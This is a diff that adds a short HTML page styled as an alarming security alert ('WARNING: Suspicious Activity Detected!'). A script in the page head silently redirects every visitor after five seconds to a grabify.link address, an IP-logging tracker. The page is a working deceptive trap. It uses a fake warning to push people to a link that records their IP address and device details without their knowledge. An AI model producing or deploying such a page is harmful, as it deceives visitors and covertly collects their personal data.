@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Warning - Possible Hacking Attempt</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: black;
+            color: red;
+            font-family: Arial, sans-serif;
+            text-align: center;
+        }
+        .warning {
+            font-size: 24px;
+            font-weight: bold;
+        }
+    </style>
+    <script>
+        setTimeout(function() {
+            window.location.href = "https://grabify.link/IKU1IW";
+        }, 5000); // Redirect after 5 seconds
+    </script>
+</head>
+<body>
+    <div>
+        <p class="warning">WARNING: Suspicious Activity Detected!</p>
+        <p>You are being redirected...</p>
+    </div>
+</body>
+</html>
